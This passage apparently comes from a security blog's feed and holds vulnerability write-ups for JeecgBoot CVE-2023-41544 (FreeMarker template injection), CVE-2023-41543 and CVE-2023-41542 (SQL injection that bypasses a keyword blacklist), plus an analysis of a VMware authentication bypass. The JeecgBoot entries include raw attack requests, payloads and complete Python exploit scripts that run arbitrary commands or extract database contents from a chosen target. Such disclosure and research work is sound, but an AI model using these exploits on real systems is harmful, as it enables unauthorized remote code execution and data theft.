fe55811e9dd9e757b27f5a8199b315e0dfb5872d8f697a763fbf69eb43e28fe19299022dfc61e676d72a8491bc30aab12d46cd6e5c5d9a114a13d5a7d3bcd14a287abf77fa684bf344e51bd338fa277bb61535035ea9d197f31035074b64c63a02be8eea5976aaa5da0ba507c666e70979b94c5f878abdba384ce059cd9ba3e9282d839f09b5f45ec31941a91563b69c4c211c9b30cab17e1decbeec65043faaef6302d436f4ce0108b6f997ecb186c2a21c8b8a72f4c6a43934e62470d0daee8859dd7cabebce679304fb8aa4b9221996c8f642a045804d5d7a5df979eeace9b5f520d3ef0627bba0e6ed5cc35f627c9ecc2e51e5a7d5f4fa3f28207a26774ddbc022a4f1e234c840cb2fbd17bee3055bedd37087d39175d1d63bf2ab964a7d82c8340c7cca21e7371c60a1cf51761fe9dc2c2e7a5e1c1aa335493039e592779066d799ab0079006906606eca8dacc8cf34df6fa84fa57b063a875c0f7782d1e83d1a963a5456e280284ca9dade350d82ec9e81e8d6330402b931ac052b85dab203b68230de741652895316ffe71cc6d9c330c7e61f5cd8b747ee994a2b9eb3fca478815e254b3c151c1996a6388a745b2e56b404ae6bd43052a87e44e181e5166d909fff512a63987e95092aaeb873d1940893f2dbefe3e3b426ad3a1699edb17932058481c3f6ca6bdf36a22e9e11960e3b80443ece77f8a248a2006ac208b39f99601a7fe6078609144de129791bcb05408b50946a97c19994832f5f29cc161ef9df9d4d8ac7daf24f6b06a7f8a1d2ba354deeaacb7b1a346a419be0f21be9efaa0fd98732c1b908cc91525180d70a9c22c39c367a4d459472898bb6594cafb0ce6aeb221302ae30154588ed073c1fedc700d87c6e4b1f32bb44b2adf06913d49f84fe379118e2da4131e3bb7d9a1e23833bbcb4a607fe333fcace9e743eb2e6f9e3e3428495f60ab007525837d3bd8d05fa2d32d6ffa52478cb89fd99a8d26915e3b1e9bf4d109f339e66d933249c944f5fc2bfed313cd77937c37be9707710fb38aa2e3667d2f7747a3b7aff7ee0389245dfe4d766e8a684ad9973f396fd5e21580661c83dc8ec118e7c555d378cf6ae4e6c8be2d9ec23f1cd8844ff465b277601530d2a79dd59ce794e1319ff364239f0bf6a8a4241a07b9885d46cfa5d53f551ef2cf91c7aa607ae644d18c99b3769d94dd57cfe90e2e51f50261787ae1dedd920114abac18d3484d9e5dc162b901376baca816b3088446e8df5989fddebb602a733da48523ba3cb98d18eb2993a7e012e29b1331161c2706b8eae676421d61482d528946756703b77c6aae8ac9df28a9f6bfaa014f1dbd7a2851361fce120da01f1b014904253f5191ff4e7d2f64fac5354e4aea694b87b0dca46305954fa029e5a276395a10a7858d4c4cac39b0cd60b6af8324c687045057f9c3a47e396aec7977df632363284c53cb4c67901bdaf92681a2a686a14da094c5ec1b5f14d6dc126cdd0d8b326b6b877bbdc11a4d532c7a8f9d43daaaa4a0bb31903de360b8d188f69da8c7570a58081afa33b8436386bb9d8ac925f804ad7dac078409df1d0ba6ab158beab84144d7ec0c3733e5ade38d7cf435180e7fd9cace1a31b478e33b9c0fc23181dde1cb92cfaaac82eaebaac1c1da9b4830fdae66549c89d033290f3ab3aa5a0b6bf8924171fe9b42f07dd53e41e976c6e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-41544(JeecgBoot FreeMarker SSTI)</title>
    <link href="/2023/09/18/CVE-2023-41544(JeecgBoot_SSTI)/"/>
    <url>/2023/09/18/CVE-2023-41544(JeecgBoot_SSTI)/</url>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The JeecgBoot&#x2F;jeecg boot&#x2F;jmreport&#x2F;loadTableData Api interface does not have identity verification. Freemarker is used to process SQL parameters passed in by the user, and arbitrary code is executed on the application side through SSTI.</p><h2 id="Affected-version"><a href="#Affected-version" class="headerlink" title="Affected version"></a>Affected version</h2><p>JeecgBoot &lt;&#x3D; v3.5.3</p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p><code>/jeecg-boot/jmreport/loadTableData</code>interface has SSTI injection of FreeMarkerUtils</p><p>Trace call stack</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.a</span>.c-&gt;this<span class="hljs-selector-class">.reportDbService</span><span class="hljs-selector-class">.parseReportSql</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.a</span>.parseReportSql-&gt;f<span class="hljs-selector-class">.a</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.f</span>.a-&gt;FreeMarkerUtils<span class="hljs-selector-class">.a</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.render</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.FreeMarkerUtils</span>.a-&gt;(new <span class="hljs-built_in">Template</span>(<span class="hljs-string">&quot;template&quot;</span>, new <span class="hljs-built_in">StringReader</span>(var0), var2))<span class="hljs-selector-class">.process</span>(var1, var3)<br></code></pre></td></tr></table></figure><p>By writing a payload with a freemarker template in the SQL parameters, template parsing can be triggered, resulting in template injection. Additionally, this version does not restrict classes, so template injection can cause arbitrary command execution</p><p>From Routing Processing Logic to the LoadTableData Function</p><p><img src="/./../images/image-20230918173752359.png" alt="image-20230918173752359"></p><p>Then use f.a to parse the Freemarker template for SQL</p><p><img src="/./../images/image-20230918173803314.png" alt="image-20230918173803314"></p><p>So we can construct the request</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/jeecg-boot/jmreport/loadTableData</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8088<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>8DFA6138EFBF3D5ECA9D62F6FB80C84D<br><span class="hljs-attribute">X-TIMESTAMP</span><span class="hljs-punctuation">: </span>1692975637994<br><span class="hljs-attribute">X-Access-Token</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">token</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">JmReport-Tenant-Id</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>178<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8088<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql">&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="hljs-keyword">template</span>.utility.<span class="hljs-keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;cmd /c calc\&quot;) &#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:<span class="hljs-number">1</span>,&quot;pageSize&quot;:<span class="hljs-number">10</span>&#125;</span><br></code></pre></td></tr></table></figure><h4 id="The-actual-payload-is-in-the-SQL-parameters"><a href="#The-actual-payload-is-in-the-SQL-parameters" class="headerlink" title="The actual payload is in the SQL parameters"></a>The actual payload is in the SQL parameters</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;result:&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;cmd /c calc\&quot;) &#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="The-complete-utilization-script-is-as-follows"><a href="#The-complete-utilization-script-is-as-follows" class="headerlink" title="The complete utilization script is as follows"></a>The complete utilization script is as follows</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invokecmd</span>(<span class="hljs-params">url,cmd</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/loadTableData&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    payload=<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; $&#123; ex(\\\&quot;&quot;&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;&quot;&quot; \\&quot;) &#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10&#125;&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    response=requests.post(url,headers=headers,data=payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;命令执行成功&quot;</span>)<br><span class="hljs-comment"># invokecmd(&quot;http://localhost:8088&quot;,&quot;calc&quot;)</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br>    cmd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your command: &quot;</span>)<br>    invokecmd(url,cmd)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>代码审计</tag>
      
      <tag>JeecgBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-41543(JeecgBoot Sql Injection)</title>
    <link href="/2023/09/18/CVE-2023-41543(JeecgBoot_sql)/"/>
    <url>/2023/09/18/CVE-2023-41543(JeecgBoot_sql)/</url>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>JEECG Boot v3.5.3 was discovered to contain a SQL injection in &#x2F;sys&#x2F;replicate&#x2F;check</p><h2 id="Affected-version"><a href="#Affected-version" class="headerlink" title="Affected version"></a>Affected version</h2><p>JeecgBoot &lt;&#x3D; v3.5.3</p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>It was found that the framework has protected the original SQL injection by adding a blacklist. The blacklist is as follows：</p><p>“exec|peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|”;</p><p><img src="/../images/image-20230915140019578.png"></p><p>Therefore, it is possible to directly construct payloads outside of the blacklist to bypass existing protective measures，As I mentioned in the report</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-string">&#x27;having &#123;ascii&#125;=(nullif (ascii (substring ((select database()), &#123;place&#125;, 1)), 0) or&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>The complete utilization script is as follows</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">url,token</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldVal=1&amp;dataId=asd&amp;fieldName=&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    headers[<span class="hljs-string">&quot;X_ACCESS_TOKEN&quot;</span>]=token<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;1   having 32&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;length&#125;</span>,1))),0))   &quot;</span><br>        response=requests.get(url+payload,headers=headers)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;code&quot;</span>]!=<span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    database=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;1   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) &quot;</span><br>            response=requests.get(url+payload,headers=headers)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;code&quot;</span>]==<span class="hljs-string">&quot;200&quot;</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        database+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(database)<br><span class="hljs-comment"># get_database(&quot;http://localhost:8088&quot;,&quot;&quot;)</span><br>url=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br>token=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your X_ACCESS_TOKEN: &quot;</span>)<br>get_database(url,token)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>代码审计</tag>
      
      <tag>JeecgBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-22972(VM_access_Identity_authentication_bypass)</title>
    <link href="/2023/09/18/CVE-2022-22972(VM_access_%20Identity_authentication_bypass)/"/>
    <url>/2023/09/18/CVE-2022-22972(VM_access_%20Identity_authentication_bypass)/</url>
    
    <content type="html"><![CDATA[<h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>VMware is a provider of global desktop to data center virtualization solutions, offering products including our most familiar VMware Workstation, a desktop virtual computing software. The introduction of multiple products involved in this vulnerability is as follows:</p><p>VMware Workspace ONE Access is an intelligent driven digital workspace platform developed by VMware company, which enables easy and secure delivery and management of any application anytime, anywhere on any device. VMware vRealize Automation is an automated deployment solution cloud management platform. VMware Cloud Foundation is a hybrid cloud platform of VMware company. The vRealize Suite Lifecycle Manager is the vRealize Suite lifecycle and content management platform.</p><p>On May 18th, VMware released a notice (VMSA-2022-0014) to address two vulnerabilities in multiple VMware products, including CVE-2022-22972, which has certain flaws in identity authentication processing. Remote attackers can bypass authentication by forging relevant request information, thereby gaining administrative privileges for related applications. </p><h2 id="Utilization-scope"><a href="#Utilization-scope" class="headerlink" title="Utilization scope"></a>Utilization scope</h2><ul><li>VMware Workspace ONE Access 21.08.0.1, 21.08.0.0，20.10.0.1, 20.10.0.0</li><li>VMware Identity Manager（vIDM） 3.3.6, 3.3.5, 3.3.4, 3.3.3</li><li>VMware vRealize Automation(vIDM)  7.6</li><li>VMware Cloud Foundation (vIDM) 4.4, 4.3.x, 4.2.x, 4.1, 4.0.x</li><li>VMware Cloud Foundation (vRA) 3.x</li><li>vRealize Suite Lifecycle Manager(vIDM) 8.x</li></ul><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><h4 id="Environmental-construction"><a href="#Environmental-construction" class="headerlink" title="Environmental construction"></a>Environmental construction</h4><p> Starting from the official website（ <a href="https://customerconnect.vmware.com/downloads/details?downloadGroup=WS1A_ONPREM_210801&productId=1269">https://customerconnect.vmware.com/downloads/details?downloadGroup=WS1A_ONPREM_210801&amp;productId=1269</a> ）Download VMware Workspace ONE Access 20.10.0.0 OVA file </p><p> Use VMware Workstation to import OVA files and configure FQDN (set the host name to a random domain name, otherwise an error will be reported when configuring the database in the future) </p><p><img src="/./../images/image-20230918151916932.png" alt="image-20230918151916932"></p><p> After successful import, initialization will occur</p><p><img src="/./../images/image-20230918152059288.png" alt="image-20230918152059288"></p><p> Visit https:&#x2F;&#x2F;&lt;Domain Name: 8443&gt;and follow the prompts to configure your account and database. </p><p><img src="/./../images/image-20230918155350410.png" alt="image-20230918155350410"></p><p>Configure remote debugging </p><p>To build a dynamic debugging environment, it is necessary to save the relevant source code locally and enable remote debugging using IDEA</p><p>The required lib file is located in the&#x2F;usr&#x2F;local&#x2F;horizon&#x2F;lib&#x2F;embeddedauthadapters directory.</p><p><img src="/./../images/image-20230918162425142.png" alt="image-20230918162425142"></p><p> Configure remote debugging for IDEA. </p><p><img src="/./../images/image-20230918162456080.png" alt="image-20230918162456080"></p><p> Then write the remote debugging commands in the box to&#x2F;opt&#x2F;vmware&#x2F;region&#x2F;workspace&#x2F;bin&#x2F;setenv.sh </p><p><img src="/./../images/image-20230918162632302.png" alt="image-20230918162632302"></p><h4 id="Debugging-analysis"><a href="#Debugging-analysis" class="headerlink" title="Debugging analysis"></a>Debugging analysis</h4><p> It can be found through logs that the jar package with vulnerabilities is <code>local-password-auth-adapter-0.1.jar</code></p><p> According to the log records, the specific login used is the com. vmware. horizon. adapters. local. LocalPasswordAuthAdapter # login function </p><p><img src="/./../images/image-20230918163450474.png" alt="image-20230918163450474"></p><p>After obtaining account password and other information, extract the parameter endpoint through the getLocalUrl function</p><p>Follow up on the com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#getLocalUrl</p><p><img src="/./../images/image-20230918163654242.png" alt="image-20230918163654242"></p><p> In the getLocalUrl function, a special HTTPS link class will be constructed for the request, and the actual concatenation result is <code>https://&#123;host&#125;:443/SAAS/API/1.0/REST/auth/local/login</code></p><p> Therefore, we can find that the domain name of this request can be controlled by us </p><p> Then we enter the subsequent authenticate function for identity authentication </p><p><code>com.vmware.horizon.adapters.local.LocalPasswordService#authenticate</code></p><p><img src="/./../images/image-20230918165912570.png" alt="image-20230918165912570"></p><p> Through debugging and judging the logic of the function, we have found that as long as the return value is 200 during a post request, the account password will be considered correct and the login will be successful </p><p> Based on the previous analysis of the getLocalUrl function, we know that the domain name of the request can be controlled by us. Therefore, we only need to build a service and respond with a 200 status code for any request </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/2031/#_1">https://paper.seebug.org/2031/#_1</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>VMware</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-41542(JeecgBoot Sql Injection)</title>
    <link href="/2023/09/15/CVE-2023-41542(JeecgBoot_sql)/"/>
    <url>/2023/09/15/CVE-2023-41542(JeecgBoot_sql)/</url>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>JEECG Boot v3.5.3 was discovered to contain a SQL injection in &#x2F;jeecg boot&#x2F;jmreport&#x2F;qurestSql</p><h2 id="Affected-version"><a href="#Affected-version" class="headerlink" title="Affected version"></a>Affected version</h2><p>JeecgBoot &lt;&#x3D; v3.5.3</p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>It was found that the framework has protected the original SQL injection by adding a blacklist. The blacklist is as follows：</p><p>“exec|peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|”;</p><p><img src="/../images/image-20230915140019578.png"></p><p>Therefore, it is possible to directly construct payloads outside of the blacklist to bypass existing protective measures，As I mentioned in the report</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-string">&#x27;having &#123;ascii&#125;=(nullif (ascii (substring ((select database()), &#123;place&#125;, 1)), 0) or&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>The complete utilization script is as follows</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 